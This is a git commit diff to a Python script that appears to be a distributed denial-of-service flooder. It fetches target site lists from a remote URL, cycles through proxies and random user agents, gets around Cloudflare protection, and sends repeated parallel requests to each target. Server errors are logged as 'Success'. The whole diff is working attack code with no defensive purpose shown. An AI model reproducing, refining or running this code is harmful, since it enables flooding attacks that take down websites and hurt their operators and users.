6006c3182322a86ad9877aaf7813769f4ec2cc45
ignitedevua <ignitedevua@gmail.com>
2022-03-11 01:20:29 +0200

    update

--- main.py
+++ main.py
@@ -5,11 +5,12 @@ import aiohttp
 import json
 import requests
 import threading
-from asyncio import Queue
+from asyncio import Queue, sleep
 from sys import stderr
 from loguru import logger
 from urllib3 import disable_warnings
 
+from threading import Thread
 from aiocfscrape import CloudflareScraper
 from pyuseragents import random as random_useragent
 
@@ -23,8 +24,7 @@ SITES_HOSTS = ["https://gitlab.com/jacobean_jerboa/sample/-/raw/main/sample",
 
 
 class RequestCounter():
-    def __init__(self):
-        self._count_server_error = 0
+    def __init__(self):        
         self._count_no_responce = 0
         self._count_alive = 0
         self._total = 0
@@ -36,35 +36,29 @@ class RequestCounter():
             self._count_no_responce += 1
             self._total += 1
 
-    async def incrementServerError(self):
-        async with self._read_lock:
-            self._count_server_error += 1
-            self._total += 1
-    
     async def incrementAlive(self):
         async with self._read_lock:
             self._count_alive += 1           
             self._total += 1  
 
     def _reset(self):
-        self._count_server_error = 0
         self._count_no_responce = 0
         self._count_alive = 0
-
 
     async def printStats(self):
         async with self._read_lock:
             if time.time() >= self._lastupdate + 60:
                 self._lastupdate = time.time()
-                logger.info(f'Total: {self._total}, rpm {self._count_server_error+self._count_no_responce+self._count_alive}, Alive: {self._count_alive},  Server error:{self._count_server_error}, No response:{self._count_no_responce}')
+                logger.info(f'Total: {self._total}, rpm {self._count_no_responce+self._count_alive}, Success: {self._count_alive},  Fail:{self._count_no_responce}')
                 self._reset()
 
 
 class WorkItem:
-    def __init__(self,url:str, proxy:str, active:bool = False):
+    def __init__(self ,url:str, proxy:str = None, request:int = 0, fail:int = 0):
         self.url = url
         self.proxy = proxy
-        self.active = active
+        self.request_count = request
+        self.fail_count = fail
 
 
 class JsonLoader:
@@ -98,9 +92,13 @@ class JsonLoader:
     def loadHosts(self,hosts:list):
         self._list = []
         for link in hosts:
-            data = requests.get(link, timeout=5).json()
-            for page in data:
-                self._list.append(page["page"])
+            try:
+                data = requests.get(link, timeout=5).json()
+                for page in data:
+                    self._list.append(page["page"])
+            except Exception as e:
+                logger.debug(f'Error processing url {link}')
+                pass
         self._count = len(self._list)
         logger.info(f'Loaded {self._count} hosts')            
 
@@ -130,7 +128,7 @@ HEADERS_TEMPLATE = {
     'Accept-Encoding': 'gzip, deflate, br'
 }
 
-sites = JsonLoader()
+sites = JsonLoader(True)
 proxies = JsonLoader()
 rcounter = RequestCounter()
  
@@ -138,70 +136,77 @@ rcounter = RequestCounter()
 
 lastupdate = 0
 
-def updateResources(queue:Queue):
+def updateResources():
     global lastupdate
     if time.time() > lastupdate + 60*5:
         lastupdate = time.time()
         sites.loadHosts(SITES_HOSTS)
         proxies.loadFile("proxy.json","ip")
-        queue.put_nowait(WorkItem(None,None))
-
- 
-async def worker(worker_id: int, queue: Queue, session: CloudflareScraper):
-    while True:
-        updateResources(queue)
-        work_item: WorkItem = await queue.get()
-        await process_page(worker_id, work_item, queue, session)
-        queue.task_done()
 
 def _get_headers() -> dict:
     headers = HEADERS_TEMPLATE.copy()
     headers['User-Agent'] = random_useragent()
     return headers
+
  
-async def process_page(worker_id: int,work_item: WorkItem, queue: Queue, session: CloudflareScraper):
-    await rcounter.printStats()
-    status = -1
-    headers = _get_headers()
+async def worker(worker_id: int):
+    while True:
+        async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
+            url = sites.getNext()
+            if url:
+                work_item = WorkItem(url)
+                proxy_index = 0
 
-    try:
-        response = await asyncio.wait_for(session.get(work_item.url, headers=headers, proxy=work_item.proxy, verify_ssl=False), timeout=READ_TIMEOUT)
-        status = response.status
-    except Exception as e:
-        # logger.debug(f'Error processing url {work_item.url}')
-        pass
+                while work_item.request_count<MAX_REQUESTS_TO_SITE:
+                    status = -1
+                    headers = _get_headers()
+            
+                    try:
+                        response = await asyncio.wait_for(session.get(work_item.url, headers=headers, proxy=work_item.proxy, verify_ssl=False), timeout=READ_TIMEOUT)
+                        status = response.status
+                    except Exception as e:
+                        # logger.debug(f'Error processing url {work_item.url}')
+                        pass
+                    
+                    work_item.request_count += 1
 
-    if status >=200 and status < 500: # if no server errors, assume the server is alive
-        # logger.warning(f'[{worker_id}]  {work_item.url} - {status}, proxy: {work_item.proxy}')
-        await rcounter.incrementAlive()
-        queue.put_nowait( WorkItem(work_item.url, proxy=work_item.proxy) )
-        return
-    elif status >= 500:
-        await rcounter.incrementServerError()
-        # logger.debug(f'[{worker_id}] {work_item.url} - {status}, proxy: {work_item.proxy}')
-    else: # may be down or blocked
-        await rcounter.incrementNoResponse()
-        # logger.debug(f'[{worker_id}] {work_item.url} - {status}, proxy: {work_item.proxy}')
-    
-    url = sites.getNext()
-    
-    if not url:
-        return
-    
-    proxy_list = proxies.getAll()
-    for _ in range(MAX_REQUESTS_TO_SITE):
-        for proxy in proxy_list:
-            w = WorkItem(url, f'http://{proxy}')
-            queue.put_nowait( w )
+                    if (200 <= status <= 302) or (status >= 500):
+                        # logger.warning(f'[{worker_id}]  {work_item.url} - {status}, proxy: {work_item.proxy} ({work_item.request_count})')
+                        await rcounter.incrementAlive()
+                    else:
+                        await rcounter.incrementNoResponse()
+                        # logger.debug(f'[{worker_id}] {work_item.url} - {status}, proxy: {work_item.proxy} ({work_item.request_count})')
+                        
+                        if proxy_index < proxies.count():
+                            proxy_list = proxies.getAll()
+                            work_item.proxy = f'http://{proxy_list[proxy_index]}'
+                            proxy_index += 1
+        
+
+async def timer():
+    while True:
+        updateResources()
+        await rcounter.printStats()
+        await sleep(1)
+
+def timer_loop():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(timer())
+    loop.close()
 
     
-async def main():
-    queue = Queue()
-    updateResources(queue)
-    async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
-        workers = [asyncio.create_task(worker(i, queue, session)) for i in range(PARALLEL_COUNT)]
-        await queue.join()
-        [w.cancel() for w in workers]
+def main():
+
+    Thread(target=timer_loop, daemon=True).start()
+
+    updateResources()
+    loop = asyncio.get_event_loop()
+    union = asyncio.gather(*[
+        worker(i)
+        for i in range(PARALLEL_COUNT)
+    ])
+    loop.run_until_complete(union)
 
 
 if __name__ == '__main__':
@@ -211,4 +216,4 @@ if __name__ == '__main__':
         format='<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>'
     )
     # disable_warnings()
-    asyncio.run(main())
+    main()
